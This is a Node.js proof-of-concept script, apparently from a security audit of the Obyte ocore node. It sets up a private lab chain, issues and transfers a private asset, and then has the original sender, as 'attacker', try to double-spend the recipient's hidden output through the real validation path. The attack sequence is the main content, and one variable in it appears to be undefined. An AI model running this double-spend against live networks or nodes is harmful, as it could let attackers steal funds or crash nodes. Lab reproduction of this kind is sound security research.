// p1-attack.js — P1 PoC: private-payment doublespend crash reachability (sites 1662/2289/1678)
// Real-path: compose via the real composer, validate via validation.validate, save via writer.saveJoint,
// deliver private elements via private_payment.validateAndSavePrivatePaymentChain (the real chain flow).
"use strict";
const path = require("path");
const fs = require("fs");
const O_CORE = "/Users/matheusvsky/Documents/trab/obyte-ocore-2026-08-ocore";
const OUT = path.join(__dirname);

// env BEFORE ocore require
const genesisFile = path.join(OUT, "p1-genesis.json");
const saved = JSON.parse(fs.readFileSync(genesisFile, "utf8"));
process.env.GENESIS_UNIT = saved.genesis.unit;
process.env.COUNT_WITNESSES = "1";
process.env.MAJORITY_OF_WITNESSES = "1";

const dataDir = path.join(OUT, ".p1data");

// pre-provision the lab DB (private-network operator pattern) BEFORE db.js loads
const dbFile = path.join(dataDir, "byteball.sqlite");
function preProvision() {
  if (fs.existsSync(dbFile)) return Promise.resolve();
  return new Promise((resolve, reject) => {
    fs.mkdirSync(dataDir, { recursive: true });
    fs.copyFileSync(path.join(O_CORE, "initial-db/initial.byteball.sqlite"), dbFile);
    const sqlite3 = require(O_CORE + "/node_modules/sqlite3");
    const d = new sqlite3.Database(dbFile);
    const rows = [
      ["op_list", JSON.stringify([saved.addresses.witness_addr]), -1],
      ["base_tps_fee", "10", -1],
      ["tps_interval", "1", -1],
      ["tps_fee_multiplier", "10", -1],
      ["threshold_size", "10000", -1],
    ];
    d.serialize(() => {
      d.run(`CREATE TABLE IF NOT EXISTS system_vars (
        subject VARCHAR(50) NOT NULL,
        value TEXT NOT NULL,
        vote_count_mci INT NOT NULL,
        is_emergency TINYINT NOT NULL DEFAULT 0,
        creation_date TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
        PRIMARY KEY (subject, vote_count_mci DESC))`);
      const stmt = d.prepare(`INSERT OR REPLACE INTO system_vars (subject, value, vote_count_mci) VALUES (?,?,?)`);
      rows.forEach(r => stmt.run(r[0], r[1], r[2]));
      stmt.finalize(() => d.close(() => { console.log("pre-provisioned lab DB"); resolve(); }));
    });
  });
}

// patch desktop_app
const desktop_app = require(O_CORE + "/desktop_app.js");
desktop_app.getAppRootDir = function () { return O_CORE; };
desktop_app.getAppDataDir = function () { return dataDir; };

const constants = require(O_CORE + "/constants.js");
const conf = require(O_CORE + "/conf.js");
conf.bLight = false;
["aa2UpgradeMci", "aa3UpgradeMci", "v4UpgradeMci", "pemCurvesFixMci", "noPrivateAssetsWithConditionsUpgradeMci",
 "timestampUpgradeMci", "includeKeySizesUpgradeMci", "lastBallStableInParentsUpgradeMci",
 "witnessedLevelMustNotRetreatUpgradeMci", "witnessedLevelMustNotRetreatFromAllParentsUpgradeMci",
 "branchedMinMcWlUpgradeMci", "altBranchByBestParentUpgradeMci", "spendUnconfirmedUpgradeMci",
 "bestParentPrefersOpUpgradeMci", "tpsFeeRecipientsFixMci"].forEach(k => { constants[k] = 0; });
constants.COUNT_WITNESSES = 1;
constants.MAJORITY_OF_WITNESSES = 1;

const lib = {};
function loadLib() {
  if (lib.db) return lib;
  lib.db = require(O_CORE + "/db.js");
  lib.storage = require(O_CORE + "/storage.js");
  lib.objectHash = require(O_CORE + "/object_hash.js");
  lib.ecdsa = require(O_CORE + "/node_modules/secp256k1");
  return lib;
}
const util = require("util");
const crypto = require("crypto");

const { keys, addresses } = saved;
const signer = {
  readPrivateKey: (address, path, cb) => {
    for (const [name, k] of Object.entries(keys)) {
      const addr = loadLib().objectHash.getChash160(["sig", { pubkey: k.pub }]);
      if (addr === address) return cb(null, Buffer.from(k.priv, "hex"));
    }
    return cb(Error("no key for " + address));
  },
  readSigningPaths: (conn, address, cb) => {
    cb({ r: 1 });
  },
};

function waitForDb() {
  return new Promise((resolve) => {
    function tryConnect() {
      try { loadLib().db.takeConnectionFromPool((conn) => { conn.query("SELECT 1", () => { conn.release(); resolve(); }); }); }
      catch (e) { setTimeout(tryConnect, 500); }
    }
    setTimeout(tryConnect, 500);
  });
}
function query(sql, params) {
  return new Promise((resolve, reject) => {
    loadLib().db.takeConnectionFromPool((conn) => { conn.query(sql, params || [], (rows) => { conn.release(); resolve(rows); }); });
  });
}

// real-path validate + save
function validateAndSave(objJoint, tag) {
  return new Promise((resolve) => {
    const validation = require(O_CORE + "/validation.js");
    validation.validate(objJoint, {
      ifOk: (objValidationState) => {
        const writer = require(O_CORE + "/writer.js");
        writer.saveJoint(objJoint, objValidationState, null, (err) => {
          console.log(`[${tag}] SAVED ${objJoint.unit.unit} err=${err || "none"}`);
          resolve({ ok: true, err });
        });
      },
      ifUnitError: (err) => { console.log(`[${tag}] UNIT-ERROR: ${err}`); resolve({ ok: false, err }); },
      ifJointError: (err) => { console.log(`[${tag}] JOINT-ERROR: ${err}`); resolve({ ok: false, err }); },
      ifTransientError: (err) => { console.log(`[${tag}] TRANSIENT: ${err}`); resolve({ ok: false, err }); },
      ifNeedHashTree: () => { console.log(`[${tag}] NEED-HASH-TREE`); resolve({ ok: false, err: "need-hash-tree" }); },
      ifNeedParentUnits: (arrMissing) => { console.log(`[${tag}] NEED-PARENTS ${JSON.stringify(arrMissing)}`); resolve({ ok: false, err: "need-parents" }); },
      ifKnown: () => { console.log(`[${tag}] KNOWN`); resolve({ ok: false, err: "known" }); },
      ifKnownBad: () => { console.log(`[${tag}] KNOWN-BAD`); resolve({ ok: false, err: "known-bad" }); },
    });
  });
}

function composeJoint(params) {
  return new Promise((resolve) => {
    const composer = require(O_CORE + "/composer.js");
    params.signer = signer;
    params.callbacks = {
      ifOk: (objJoint, assocPrivatePayloads) => resolve({ ok: true, objJoint, assocPrivatePayloads }),
      ifError: (err) => resolve({ ok: false, err }),
      ifNotEnoughFunds: (err) => resolve({ ok: false, err }),
    };
    composer.composeJoint(params);
  });
}

async function deliverPrivateChain(arrPrivateElements, tag) {
  return new Promise((resolve) => {
    const pp = require(O_CORE + "/private_payment.js");
    pp.validateAndSavePrivatePaymentChain(arrPrivateElements, {
      ifError: (err) => { console.log(`[${tag}] CHAIN-ERROR: ${err}`); resolve({ ok: false, err }); },
      ifOk: () => { console.log(`[${tag}] CHAIN-OK`); resolve({ ok: true }); },
    });
  });
}

async function main() {
  await preProvision();
  const { storage } = loadLib();
  await waitForDb();
  await storage.initCaches();

  // insert genesis via the real writer path (joint already in kvstore = received-from-peer state)
  const kvstore = require(O_CORE + "/kvstore.js");
  await new Promise((res, rej) => kvstore.put("j\n" + saved.genesis.unit, JSON.stringify({ unit: saved.genesis }), (e) => (e ? rej(e) : res())));
  const writer = require(O_CORE + "/writer.js");
  const gstate = { last_ball_mci: 0, count_primary_aa_triggers: 0, sequence: "good", arrAdditionalQueries: [], bUnderWriteLock: false, witnessed_level: 0, best_parent_unit: null };
  await util.promisify(writer.saveJoint)({ unit: saved.genesis }, gstate, null, () => {});
  console.log("GENESIS SAVED:", saved.genesis.unit);

  const sender_addr = addresses.sender_addr;
  const recipient_addr = addresses.recipient_addr;

  // --- U1: sender defines private divisible asset ---
  const assetDef = {
    cap: 0,
    is_private: true,
    is_transferrable: false,
    auto_destroy: true,
    fixed_denominations: false,
    issued_by_definer_only: true,
  };
  const r1 = await composeJoint({
    paying_addresses: [sender_addr],
    outputs: [{ address: sender_addr, amount: 0 }],
    messages: [{ app: "asset", payload_location: "inline", payload: assetDef }],
  });
  if (!r1.ok) { console.log("U1 compose failed:", r1.err); process.exit(1); }
  console.log("U1 (asset def) composed:", r1.objJoint.unit.unit);
  const assetHash = objectHash.getChash160(assetDef);
  console.log("asset:", assetHash);
  const s1 = await validateAndSave(r1.objJoint, "U1");
  if (!s1.ok) process.exit(1);

  // --- U2: sender issues + sends private asset to recipient (output X) ---
  const amountX = 100000000;
  const r2 = await composeJoint({
    paying_addresses: [sender_addr],
    asset_outputs: [{ asset: assetHash, outputs: [{ address: recipient_addr, amount: amountX }] }],
  });
  if (!r2.ok) { console.log("U2 compose failed:", r2.err); process.exit(1); }
  console.log("U2 (private payment issue->recipient) composed:", r2.objJoint.unit.unit);
  const s2 = await validateAndSave(r2.objJoint, "U2");
  if (!s2.ok) process.exit(1);

  // deliver private elements for U2 (recipient's node learns the hidden output X)
  // chain elements: [{unit, message_index, payload, output, output_index}]
  const r2Msg = r2.objJoint.unit.messages.find((m) => m.app === "payment");
  const r2Payload = r2.assocPrivatePayloads[r2Msg.payload_hash];
  const elems2 = [
    {
      unit: r2.objJoint.unit.unit,
      message_index: r2.objJoint.unit.messages.indexOf(r2Msg),
      payload: r2Payload,
      output: r2Payload.outputs[0],
      output_index: 0,
    },
  ];
  const d2 = await deliverPrivateChain(elems2, "U2-chain");
  if (!d2.ok) process.exit(1);

  // verify recipient balance
  const bal = await query("SELECT address, amount FROM outputs WHERE asset=? AND unit=?", [assetHash, r2.objJoint.unit.unit]);
  console.log("U2 hidden outputs in DB:", JSON.stringify(bal));

  // --- U3: recipient spends X (send back to sender) ---
  const r3 = await composeJoint({
    paying_addresses: [recipient_addr],
    to_address: sender_addr,
    amount: amountX / 2,
    asset: assetHash,
  });
  if (!r3.ok) { console.log("U3 compose failed:", r3.err); process.exit(1); }
  console.log("U3 (recipient spends X) composed:", r3.objJoint.unit.unit);
  const s3 = await validateAndSave(r3.objJoint, "U3");
  if (!s3.ok) process.exit(1);
  const r3Msg = r3.objJoint.unit.messages.find((m) => m.app === "payment");
  const r3Payload = r3.assocPrivatePayloads[r3Msg.payload_hash];
  const elems3 = [
    {
      unit: r3.objJoint.unit.unit,
      message_index: r3.objJoint.unit.messages.indexOf(r3Msg),
      payload: r3Payload,
      output: r3Payload.outputs[0],
      output_index: 0,
    },
  ];
  const d3 = await deliverPrivateChain(elems3, "U3-chain");
  if (!d3.ok) process.exit(1);

  // inspect the spend_proofs + inputs tables
  const proofs = await query("SELECT unit, address, spend_proof FROM spend_proofs ORDER BY unit");
  console.log("spend_proofs rows:", JSON.stringify(proofs));
  const inputs = await query("SELECT unit, address, src_unit, src_message_index, src_output_index, asset FROM inputs ORDER BY unit");
  console.log("inputs rows:", JSON.stringify(inputs));

  // --- V1: attacker (sender, who retains blinding) re-spends X ---
  console.log("\n=== V1: sender re-spends recipient's output X (f8 TRIPLE-1 shape, 1662 site) ===");
  const rV1 = await composeJoint({
    paying_addresses: [sender_addr],
    to_address: sender_addr,
    amount: amountX / 4,
    asset: assetHash,
  });
  if (!rV1.ok) { console.log("V1 compose failed:", rV1.err); process.exit(1); }
  console.log("V1 unit composed:", rV1.objJoint.unit.unit);
  const sV1 = await validateAndSave(rV1.objJoint, "V1");
  console.log("V1 outcome:", JSON.stringify(sV1));

  console.log("\nP1-PHASES-DONE");
  process.exit(0);
}
main().catch((e) => { console.error("FATAL:", e); process.exit(1); });
